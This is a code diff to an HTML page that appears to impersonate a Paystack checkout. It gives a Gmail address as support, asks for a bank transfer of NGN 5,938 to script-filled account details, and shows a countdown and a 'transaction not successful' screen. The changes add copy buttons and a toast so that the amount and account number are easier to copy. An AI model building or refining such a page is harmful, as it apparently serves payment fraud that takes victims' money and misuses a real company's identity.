@@ -12,11 +12,11 @@
     .header { display: flex; align-items: center; padding: 10px 0; font-size: 16px; }
     .header img { height: 18px; margin-right: 10px; }
     .email { font-size: 13px; color: #555; margin-bottom: 5px; display: flex; justify-content: space-between; }
-    .amount-green { color: #00b87c; font-weight: 600; }
+    .amount-green { color: #00b87c; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; }
     .title { font-size: 18px; font-weight: 600; margin-bottom: 15px; }
     .box { background: #f5f5f5; border-radius: 10px; padding: 15px; margin: 20px 0; }
     .label { font-size: 12px; color: gray; }
-    .value { font-size: 16px; font-weight: 500; margin-bottom: 15px; }
+    .value { font-size: 16px; font-weight: 500; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; }
     .expires { text-align: center; font-size: 12px; color: gray; margin-bottom: 20px; }
     .expires span { color: #00b87c; font-weight: bold; }
     .btn { width: 100%; padding: 15px; background: #f5f5f5; border: none; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 15px; }
@@ -30,6 +30,44 @@
     .failed-message p { font-size: 14px; color: #555; }
     .hidden { display: none !important; }
     .vc { outline: none; border: none; text-decoration: none; color: black; }
+    
+    /* Copy Button & Feedback Styles */
+    .copy-btn {
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: inline-flex;
+      align-items: center;
+      color: #00b87c;
+      transition: transform 0.1s ease;
+    }
+    .copy-btn:active {
+      transform: scale(0.9);
+    }
+    .copy-btn svg {
+      width: 16px;
+      height: 16px;
+      fill: currentColor;
+    }
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #333;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-size: 13px;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      opacity: 0;
+      z-index: 1000;
+    }
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
   </style>
 </head>
 
@@ -43,7 +81,12 @@
     <div id="payment-section">
       <div class="email">
         support.paystack@gmail.com
-        <div class="amount-green">Pay NGN 5,938</div>
+        <div class="amount-green">
+          <span id="amount-text-top">Pay NGN 5,938</span>
+          <button class="copy-btn" onclick="copyText('NGN 5,938', 'Amount copied!')" title="Copy Amount">
+            <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+          </button>
+        </div>
       </div>
 
       <div class="title">Transfer NGN 5,938 to PAYSTACK CHECKOUT</div>
@@ -51,8 +94,24 @@
       <div class="box">
         <div><div class="label">ACCOUNT NAME</div><div class="value" id="display-acc-name">...</div></div>
         <div><div class="label">BANK NAME</div><div class="value" id="display-bank-name">...</div></div>
-        <div><div class="label">ACCOUNT NUMBER</div><div class="value" id="display-acc-num">...</div></div>
-        <div><div class="label">AMOUNT</div><div class="value">NGN 5,938</div></div>
+        <div>
+          <div class="label">ACCOUNT NUMBER</div>
+          <div class="value">
+            <span id="display-acc-num">...</span>
+            <button class="copy-btn" onclick="copyAccountNum()" title="Copy Account Number">
+              <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+            </button>
+          </div>
+        </div>
+        <div>
+          <div class="label">AMOUNT</div>
+          <div class="value">
+            <span id="display-amount-box">NGN 5,938</span>
+            <button class="copy-btn" onclick="copyText('NGN 5,938', 'Amount copied!')" title="Copy Amount">
+              <svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+            </button>
+          </div>
+        </div>
       </div>
 
       <div class="expires">
@@ -80,6 +139,8 @@
       <p>Sorry, this transaction was not successful. Please try again with a new session.</p>
     </div>
   </div>
+
+  <div id="toast" class="toast">Copied to clipboard</div>
 
   <script>
     const DURATION = 30 * 60 * 1000;
@@ -171,6 +232,28 @@
 
       paymentSection.classList.add("hidden");
       processStandardTimeout(nextClicks);
+    }
+
+    function showToast(message) {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 2000);
+    }
+
+    function copyText(text, message) {
+      navigator.clipboard.writeText(text).then(() => {
+        showToast(message);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+      });
+    }
+
+    function copyAccountNum() {
+      const accNum = document.getElementById("display-acc-num").textContent;
+      copyText(accNum, "Account number copied!");
     }
 
     // Standard initial execution
